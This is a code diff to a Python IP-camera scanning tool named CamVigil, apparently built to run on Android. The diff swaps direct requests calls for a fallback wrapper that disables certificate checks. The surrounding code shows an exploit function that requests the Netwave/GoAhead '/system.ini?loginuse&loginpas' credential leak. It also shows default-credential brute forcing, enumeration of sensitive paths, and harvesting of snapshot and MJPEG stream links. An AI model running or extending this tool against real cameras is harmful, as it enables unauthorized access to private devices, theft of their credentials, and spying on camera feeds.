@@ -23,15 +23,62 @@ class AndroidOutput(io.TextIOBase):
 
 try:
     import requests
+    from requests.packages.urllib3.exceptions import InsecureRequestWarning
+    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
     REQUESTS_AVAILABLE = True
 except ImportError:
     REQUESTS_AVAILABLE = False
+    print("[!] Warning: 'requests' library not found. Falling back to urllib.")
 
-try:
-    import urllib3
-    urllib3.disable_warnings()
-except ImportError:
-    pass
+import urllib.request
+import urllib.error
+import ssl
+
+def make_request(url, auth=None, timeout=5, verify=False, method='GET', headers=None):
+    """Universal request wrapper with fallback to urllib if requests is missing."""
+    if headers is None: headers = {}
+
+    if REQUESTS_AVAILABLE:
+        try:
+            import requests
+            if auth and isinstance(auth, tuple):
+                return requests.request(method, url, auth=auth, timeout=timeout, verify=verify, headers=headers)
+            return requests.request(method, url, timeout=timeout, verify=verify, headers=headers)
+        except Exception as e:
+            if not isinstance(e, requests.exceptions.RequestException):
+                pass # Fallback to urllib for non-request errors
+            else:
+                raise e
+
+    # Urllib fallback
+    context = ssl._create_unverified_context() if not verify else None
+
+    if auth and isinstance(auth, tuple):
+        import base64
+        auth_str = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
+        headers['Authorization'] = f'Basic {auth_str}'
+
+    req = urllib.request.Request(url, method=method, headers=headers)
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=context) as response:
+            class MockResponse:
+                def __init__(self, res):
+                    self.status_code = res.getcode()
+                    self.text = res.read().decode('utf-8', errors='ignore')
+                    self.content = self.text.encode('utf-8')
+                    self.headers = dict(res.info())
+                    self.url = res.geturl()
+            return MockResponse(response)
+    except urllib.error.HTTPError as e:
+        class MockErrorResponse:
+            def __init__(self, err):
+                self.status_code = err.code
+                self.text = ""
+                self.headers = {}
+                self.url = url
+        return MockErrorResponse(e)
+    except Exception as e:
+        raise e
 
 import socket
 import sys
@@ -411,7 +458,7 @@ def directory_enumeration(ip, port, proto, brand, auth=None):
     for path in sensitive_paths:
         try:
             url = f"{proto}://{ip}:{port}{path}"
-            r = requests.get(url, auth=auth, timeout=2, verify=False)
+            r = make_request(url, auth=auth, timeout=2, verify=False)
             if r.status_code == 200:
                 print(f"       {FIRE} EXPOSED: {url} (HTTP 200)")
                 found.append(path)
@@ -425,7 +472,7 @@ def analyze_http_port(ip, port):
     try:
         proto = "https" if port in [443, 8443] else "http"
         url = f"{proto}://{ip}:{port}"
-        r = requests.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)
+        r = make_request(url, timeout=TIMEOUT, verify=False)
 
         content_type = r.headers.get('Content-Type', 'unknown')
         server = r.headers.get('Server', 'unknown')
@@ -1124,7 +1171,7 @@ def cam_over_exploit(ip, port, proto):
     """
     url = f"{proto}://{ip}:{port}/system.ini?loginuse&loginpas"
     try:
-        r = requests.get(url, timeout=3, verify=False)
+        r = make_request(url, timeout=3, verify=False)
         if r.status_code == 200 and r.content:
             # Netwave/GoAhead often return binary or weirdly formatted data
             # but sometimes it's just plaintext in the .ini
@@ -1303,14 +1350,10 @@ def scan_single_target(target_ip, specific_port=None):
             # Test HTTP
             if web_ports:
                 p = web_ports[0]
+                url = f"http{'s' if p in [443, 8443] else ''}://{target_ip}:{p}/"
+                # Try with and without auth if user/pwd are empty
                 try:
-                    url = f"http{'s' if p in [443, 8443] else ''}://{target_ip}:{p}/"
-                    # Try with and without auth if user/pwd are empty
-                    if user == "" and pwd == "":
-                        r = requests.get(url, timeout=2, verify=False)
-                    else:
-                        r = requests.get(url, auth=(user, pwd), timeout=2, verify=False)
-
+                    r = make_request(url, auth=(user, pwd) if user or pwd else None, timeout=2, verify=False)
                     if r.status_code == 200 and "login" not in r.url.lower():
                         success_cred = (user, pwd, url)
                         if user == "" and pwd == "":
@@ -1367,7 +1410,7 @@ def scan_single_target(target_ip, specific_port=None):
             for path in camera_paths:
                 url = base + path
                 try:
-                    r = requests.head(url, timeout=4, verify=False, allow_redirects=True)
+                    r = make_request(url, timeout=4, verify=False, method='HEAD')
                     if r.status_code in [200, 401, 403]:
                         link_type = "SNAPSHOT" if "snapshot" in path or "picture" in path else "MJPEG_STREAM"
                         detected_links.append({
@@ -1625,8 +1668,8 @@ def main(target_input=None):
 
     print(f"\n{SCAN} Initiating CamVigil Reconnaissance...")
 
-    # 1. Broad Discovery (UPnP/SSDP)
-    upnp_results = discover_upnp_ssdp()
+    # 1. Broad Discovery (UPnP/SSDP) - Disabled to prevent freeze
+    # upnp_results = discover_upnp_ssdp()
 
     targets = []
     try:
